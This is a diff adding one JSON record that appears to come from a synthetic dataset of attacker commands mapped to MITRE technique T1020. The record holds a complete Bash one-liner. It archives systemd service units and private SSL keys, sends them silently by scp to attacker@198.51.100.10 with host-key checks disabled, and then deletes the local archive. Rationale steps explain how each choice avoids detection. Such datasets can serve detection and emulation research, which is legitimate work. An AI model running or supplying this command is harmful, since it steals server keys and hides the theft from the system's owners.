@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/svc_keys_${ts}.tgz /etc/systemd/system /lib/systemd/system /etc/ssl/private >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/svc_keys_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/svc/ >/dev/null 2>&1 && rm -f /tmp/svc_keys_${ts}.tgz",
+  "explanation": "Aggregates systemd service units and private SSL keys for credential and service intelligence, then exfiltrates via scp silently with cleanup.",
+  "rationale_steps": [
+    "Create a single archive from service unit directories and private key storage.",
+    "Use scp with -q and -C for quiet, compressed, non-interactive transfer.",
+    "Disable host key checks to avoid interactive trust prompts.",
+    "Remove the archive locally after successful exfiltration to reduce traceability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-6eab8574",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
